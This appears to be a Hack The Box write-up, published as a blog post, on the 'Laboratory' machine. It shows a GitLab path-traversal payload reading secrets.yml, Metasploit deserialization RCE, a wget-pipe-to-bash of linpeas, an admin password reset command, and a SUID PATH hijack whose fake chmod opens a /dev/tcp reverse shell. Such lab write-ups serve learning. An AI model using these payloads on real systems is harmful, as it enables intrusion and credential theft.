@@ -1,0 +1,197 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.7.1 -->
+<title>Laboratory Write-Up | The Cyber Experiment</title>
+<meta name="generator" content="Jekyll v4.2.0" />
+<meta property="og:title" content="Laboratory Write-Up" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="This is my writeup of the laboratory machine on Hack The Box. Eventhough the box was rated easy, I found getting a foothold quite hard. I exploited 2 GitLab vulnerabilties to gain a foothold. Leveraging the foothold; I get access to the GitLab admin account that contained a private SSH key. Using the SSH key I get access to the machine and gain root privileges by exploit a SUID binary that uses relative paths. Overall a fun machine that shows how dangerous LFI can be when chained with deserialization." />
+<meta property="og:description" content="This is my writeup of the laboratory machine on Hack The Box. Eventhough the box was rated easy, I found getting a foothold quite hard. I exploited 2 GitLab vulnerabilties to gain a foothold. Leveraging the foothold; I get access to the GitLab admin account that contained a private SSH key. Using the SSH key I get access to the machine and gain root privileges by exploit a SUID binary that uses relative paths. Overall a fun machine that shows how dangerous LFI can be when chained with deserialization." />
+<link rel="canonical" href="/htb/laboratory" />
+<meta property="og:url" content="/htb/laboratory" />
+<meta property="og:site_name" content="The Cyber Experiment" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2021-04-16T23:44:00+02:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Laboratory Write-Up" />
+<script type="application/ld+json">
+{"@type":"BlogPosting","headline":"Laboratory Write-Up","dateModified":"2021-04-16T23:44:00+02:00","datePublished":"2021-04-16T23:44:00+02:00","mainEntityOfPage":{"@type":"WebPage","@id":"/htb/laboratory"},"url":"/htb/laboratory","description":"This is my writeup of the laboratory machine on Hack The Box. Eventhough the box was rated easy, I found getting a foothold quite hard. I exploited 2 GitLab vulnerabilties to gain a foothold. Leveraging the foothold; I get access to the GitLab admin account that contained a private SSH key. Using the SSH key I get access to the machine and gain root privileges by exploit a SUID binary that uses relative paths. Overall a fun machine that shows how dangerous LFI can be when chained with deserialization.","@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/main.css"><link type="application/atom+xml" rel="alternate" href="/feed.xml" title="The Cyber Experiment" /></head>
+<body><header class="site-header" role="banner">
+
+  <div class="wrapper"><a class="site-title" rel="author" href="/">The Cyber Experiment</a><nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+        <label for="nav-trigger">
+          <span class="menu-icon">
+            <svg viewBox="0 0 18 15" width="18px" height="15px">
+              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+            </svg>
+          </span>
+        </label>
+
+        <div class="trigger"><a class="page-link" href="/about/">About</a></div>
+      </nav></div>
+</header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">Laboratory Write-Up</h1>
+    <p class="post-meta">
+      <time class="dt-published" datetime="2021-04-16T23:44:00+02:00" itemprop="datePublished">Apr 16, 2021
+      </time></p>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <p>This is my writeup of the laboratory machine on Hack The Box. Eventhough the box was rated easy, I found getting a foothold quite hard. I exploited 2 GitLab vulnerabilties to gain a foothold. Leveraging the foothold; I get access to the GitLab admin account that contained a private SSH key. Using the SSH key I get access to the machine and gain root privileges by exploit a SUID binary that uses relative paths. Overall a fun machine that shows how dangerous LFI can be when chained with deserialization.</p>
+
+<h2 id="enumeration">Enumeration</h2>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-n</span> 10.10.10.216 <span class="nt">-oA</span> nmap/laboratory
+<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>kali: 
+Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-04-16 16:42 EDT
+Nmap scan report <span class="k">for </span>10.10.10.216
+Host is up <span class="o">(</span>0.022s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 997 filtered ports
+PORT    STATE SERVICE  VERSION
+22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   3072 25:ba:64:8f:79:9d:5d:95:97:2c:1b:b2:5e:9b:55:0d <span class="o">(</span>RSA<span class="o">)</span>
+|   256 28:00:89:05:55:f9:a2:ea:3c:7d:70:ea:4d:ea:60:0f <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 77:20:ff:e9:46:c0:68:92:1a:0b:21:29:d1:53:aa:87 <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp  open  http     Apache httpd 2.4.41
+|_http-server-header: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
+|_http-title: Did not follow redirect to https://laboratory.htb/
+443/tcp open  ssl/http Apache httpd 2.4.41 <span class="o">((</span>Ubuntu<span class="o">))</span>
+|_http-server-header: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
+|_http-title: The Laboratory
+| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>laboratory.htb
+| Subject Alternative Name: DNS:git.laboratory.htb
+| Not valid before: 2020-07-05T10:39:28
+|_Not valid after:  2024-03-03T10:39:28
+| tls-alpn: 
+|_  http/1.1
+Service Info: Host: laboratory.htb<span class="p">;</span> OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+</code></pre></div></div>
+
+<h2 id="webapplication-enumeration">Webapplication Enumeration</h2>
+<p>Port 80 redirects to <code class="language-plaintext highlighter-rouge">laboratory.htb</code> so lets add that to our <code class="language-plaintext highlighter-rouge">/etc/hosts</code> file. Firefox present a certificate error indicating that the certificate is only valid for <code class="language-plaintext highlighter-rouge">git.laboratory.htb</code>, so lets add it to our <code class="language-plaintext highlighter-rouge">/etc/hosts</code> file.</p>
+
+<p><img src="/assets/htb/laboratory/gitlab-subdomain-cert-error.png" alt="certificate error" /></p>
+
+<p>I can create an account on <code class="language-plaintext highlighter-rouge">git.laboratory.htb</code> by using an <code class="language-plaintext highlighter-rouge">@laboratory.htb</code> email address. Once logged in I determine the version of GitLab by going to <code class="language-plaintext highlighter-rouge">git.laboratory.htb/help</code>.</p>
+
+<p><img src="/assets/htb/laboratory/gitlab-version.png" alt="gitlab-version" /></p>
+
+<p>Googling GitLab 12.8.1 I can find an interesting vulnerability. It is an arbitrary file read vulnerabilty (<a href="https://gitlab.com/gitlab-org/gitlab/-/issues/212175">gitlab issue</a>) that can be levereged to get RCE through a deserialization attack.</p>
+
+<p>As a learning exercise I decided to perform the LFI manually.</p>
+
+<h2 id="gitlab-arbitrary-file-read">Gitlab Arbitrary File Read</h2>
+<p>To do this manually I login into <code class="language-plaintext highlighter-rouge">git.laboratory.htb</code> and perform the following steps:</p>
+<ol>
+  <li>Create a new project named p1</li>
+  <li>Create a new project named p2</li>
+  <li>Create in p1 a new issue with the description: <code class="language-plaintext highlighter-rouge">![a](/uploads/11111111111111111111111111111111/../../../../../../../../../../../../../../opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml</code></li>
+  <li>Move the issue from p1 to p2 (Button in lower right corner)</li>
+  <li>Visit the issue in p2 to download the <code class="language-plaintext highlighter-rouge">secrets.yml</code> file</li>
+</ol>
+
+<p>From the <code class="language-plaintext highlighter-rouge">secrets.yml</code> file I extract the <code class="language-plaintext highlighter-rouge">secret_key_base</code> key</p>
+
+<h2 id="gitlab-rce">Gitlab RCE</h2>
+<p>To obtain code execution I configure the metasploit module and provide it the <code class="language-plaintext highlighter-rouge">secret-key_base</code> so it will not perform the LFI (that did not work for me). I show the used settings in the image below. I then use the resulting shell to spawn another reverseshell that I can <a href="https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/">upgrade using some python magic</a>.</p>
+
+<p><img src="/assets/htb/laboratory/gitlab-rce-msf.png" alt="msfconsole gitlab rce" /></p>
+
+<h2 id="gitlab-container-enumeration">GitLab Container Enumeration</h2>
+<p>In the reverse shell I run Linpeas.sh (without touching disk): <code class="language-plaintext highlighter-rouge">wget http://10.10.15.46:8000/linpeas.sh -O - | /bin/bash</code>.</p>
+
+<p>From the output I discover that I am currently inside a docker container. Linpeas also dumps user credentials of the GitLab application. From the <code class="language-plaintext highlighter-rouge">linpeas.sh</code> script I extract the following command to change the password of the root user:</p>
+
+<p><code class="language-plaintext highlighter-rouge">gitlab-rails runner 'user = User.find_by(email: "admin@example.com"); user.password = "pass_peass_pass"; user.password_confirmation = "pass_peass_pass"; user.save!'</code></p>
+
+<p><em>Reflection: In hindsight it would have been better opsec to have given admin privileges to my own account instead of changing the admin’s passwords. This would probably require using the gitlib console.</em></p>
+
+<h2 id="user-shell">User Shell</h2>
+<p>Next, I log in using the <code class="language-plaintext highlighter-rouge">admin@example.com:pass_peass_pass</code> credentials. As admin I can now see 2 more projects. Inside the secure docker project I find a SSH private key. Gitlab also shows that the username of the admin account is <code class="language-plaintext highlighter-rouge">dexter</code>.</p>
+
+<p><img src="/assets/htb/laboratory/gitlab-dexter-sshkey.png" alt="dexter ssh key" /></p>
+
+<p>Next, I log into the machine via SSH using the username <code class="language-plaintext highlighter-rouge">dexter</code> and the found SSH key:</p>
+
+<p><code class="language-plaintext highlighter-rouge">ssh dexter@laboratory.htb -i id_rsa_dexter</code></p>
+
+<h2 id="local-enumeration">Local Enumeration</h2>
+
+<p>And then start enumerating again using <code class="language-plaintext highlighter-rouge">linpeas.sh</code>, in the output was one interesting SUID file that I did not recognize: <code class="language-plaintext highlighter-rouge">/usr/local/bin/docker-security</code>. Googling the file I could not find anything about it, also running the file gave no output. Next I tried running it with the <code class="language-plaintext highlighter-rouge">-v</code> and <code class="language-plaintext highlighter-rouge">-h</code> flags hoping it would give some output that would reveal what the file did. However, no success here.</p>
+
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+
+<p>Next I tried ltracing to file to figure out what it does. The ltrace output shows that the binary calls the <code class="language-plaintext highlighter-rouge">chmod</code> program, without specifying the full path. This is a security risk, as the binary runs as root.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>ltrace /usr/local/bin/docker-security             
+setuid<span class="o">(</span>0<span class="o">)</span> 
+setgid<span class="o">(</span>0<span class="o">)</span> 
+system<span class="o">(</span><span class="s2">"chmod 700 /usr/bin/docker"</span> &lt;no <span class="k">return</span> ...&gt;
+<span class="nt">---</span> SIGCHLD <span class="o">(</span>Child exited<span class="o">)</span> <span class="nt">---</span>
+&lt;... system resumed&gt; <span class="o">)</span> 
+system<span class="o">(</span><span class="s2">"chmod 660 /var/run/docker.sock"</span> &lt;no <span class="k">return</span> ...&gt;
+<span class="nt">---</span> SIGCHLD <span class="o">(</span>Child exited<span class="o">)</span> <span class="nt">---</span>
+&lt;... system resumed&gt; <span class="o">)</span> 
++++ exited <span class="o">(</span>status 0<span class="o">)</span> +++
+</code></pre></div></div>
+
+<p>I know the use of relative paths can be levereged to get code execution, whowever it has been a while since I last did this. So I used <a href="https://medium.com/r3d-buck3t/hijacking-relative-paths-in-suid-programs-fed804694e6e">this blogpost</a> as a reference and get code execution by creating a fake <code class="language-plaintext highlighter-rouge">chmod</code> file containing a reverse shell and then adding it to my path.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dexter@laboratory:/tmp<span class="nv">$ </span><span class="nb">export </span><span class="nv">PATH</span><span class="o">=</span>/tmp:<span class="nv">$PATH</span>
+dexter@laboratory:/tmp<span class="nv">$ </span><span class="nb">echo</span> <span class="nv">$PATH</span>
+/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/snap/bin
+dexter@laboratory:/tmp<span class="nv">$ </span><span class="nb">chmod</span> +x ./chmod 
+dexter@laboratory:/tmp<span class="nv">$ </span>docker-security
+</code></pre></div></div>
+<p><em>Abusing the docker-security binary that uses relative paths.</em></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
+/bin/bash <span class="nt">-c</span> <span class="s2">"/bin/bash -i &gt;&amp; /dev/tcp/10.10.15.46/4243 0&gt;&amp;1"</span>
+</code></pre></div></div>
+<p><em>Contents of the fake chmod file.</em></p>
+
+<p>I read out the <code class="language-plaintext highlighter-rouge">/root/root.txt</code> flag using the resulting reverse shell.</p>
+
+
+  </div><a class="u-url" href="/htb/laboratory" hidden></a>
+</article>
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+    <h2 class="footer-heading">The Cyber Experiment</h2>
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col footer-col-1">
+        <ul class="contact-list">
+          <li class="p-name">The Cyber Experiment</li><li><a class="u-email" href="mailto:your-email@example.com">your-email@example.com</a></li></ul>
+      </div>
+
+      <div class="footer-col footer-col-2"><ul class="social-media-list"><li><a href="https://github.com/the-cyber-experiment"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#github"></use></svg> <span class="username">the-cyber-experiment</span></a></li></ul>
+</div>
+
+      <div class="footer-col footer-col-3">
+        <p>This website serves as learning tool. This website contains blog like posts that describe the usage of various tools and writeups for CTFs and any other topic that I played with.</p>
+      </div>
+    </div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
